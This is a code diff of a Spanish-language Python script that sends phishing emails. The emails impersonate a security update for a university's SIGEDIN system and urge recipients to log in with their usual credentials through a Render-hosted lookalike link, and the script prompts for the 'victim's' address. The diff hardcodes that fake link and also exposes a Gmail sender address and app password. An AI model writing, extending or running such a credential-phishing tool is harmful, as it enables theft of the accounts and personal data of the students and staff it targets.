@@ -11,15 +11,18 @@ sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
 remitente = "marlonmoncayo7474@gmail.com"
 password = "jpwy hpdh lnuy tpaw"
 
-def enviar_phishing(destinatario, enlace_localtunnel):
-    print(f"Usando enlace: {enlace_localtunnel}")
+# Enlace fijo de tu despliegue limpio en Render
+ENLACE_RENDER = "https://sigedin-uniputumayo.onrender.com"
+
+def enviar_phishing(destinatario):
+    print(f"Usando enlace oficial: {ENLACE_RENDER}")
 
     msg = MIMEMultipart("alternative")
     msg['Subject'] = "Aviso Importante: Actualizacion de Seguridad SIGEDIN"
     msg['From'] = remitente
     msg['To'] = destinatario
 
-    # Cuerpo del correo con el enlace limpio de Localtunnel
+    # Cuerpo del correo con el enlace directo y limpio de Render
     html = f"""
     <html>
       <body style="font-family: Arial, sans-serif; color: #1f2937;">
@@ -28,7 +31,7 @@ def enviar_phishing(destinatario, enlace_localtunnel):
         <p>Debido a esta actualizacion, todos los usuarios deben revalidar su cuenta antes de finalizar la semana para evitar el bloqueo temporal del perfil.</p>
         <p>Por favor, ingrese al siguiente enlace oficial de validacion:</p>
         <p style="margin: 20px 0;">
-          <a href="{enlace_localtunnel}" style="background-color: #18668f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">UniPutumayo Sigedin</a>
+          <a href="{ENLACE_RENDER}" style="background-color: #18668f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">UniPutumayo Sigedin</a>
         </p>
         <p><em>Nota: Inicie sesion con su documento y contraseña habituales.</em></p>
         <br>
@@ -54,5 +57,4 @@ def enviar_phishing(destinatario, enlace_localtunnel):
 
 if __name__ == "__main__":
     correo_destino = input("Ingrese el correo de la victima: ")
-    enlace_tunnel = input("Ingrese su enlace de Localtunnel (ej: https://xxxx.loca.lt): ")
-    enviar_phishing(correo_destino, enlace_tunnel)
+    enviar_phishing(correo_destino)
